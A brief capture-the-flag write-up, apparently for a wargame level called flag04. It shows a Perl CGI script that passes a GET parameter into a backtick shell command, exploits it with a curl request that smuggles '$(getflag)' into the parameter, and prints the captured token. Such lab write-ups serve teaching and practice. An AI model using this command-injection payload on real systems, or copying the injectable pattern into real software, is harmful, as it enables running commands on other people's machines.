In our home directory, we find a Perl script:
```pearl
    #!/usr/bin/perl
    # localhost:4747
    use CGI qw{param};
    print "Content-type: text/html";
    sub x {
      $y = $_[0];
      print `echo $y 2>&1`;
    }
    x(param("x"));`
```

The script takes a parameter and then prints it to the screen. Additionally, we know that the result is accessible at localhost:4747.

By examining the Perl script, we notice that it uses the HTTP module to print the "x" GET parameter and echoes it using the system echo command. Since this script is executed with the flag04 user's permissions, we can exploit it as follows::

`curl localhost:4747?x='$(getflag)'`

This command uses a subshell to run the getflag command within the script, allowing us to obtain the token.

`Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap`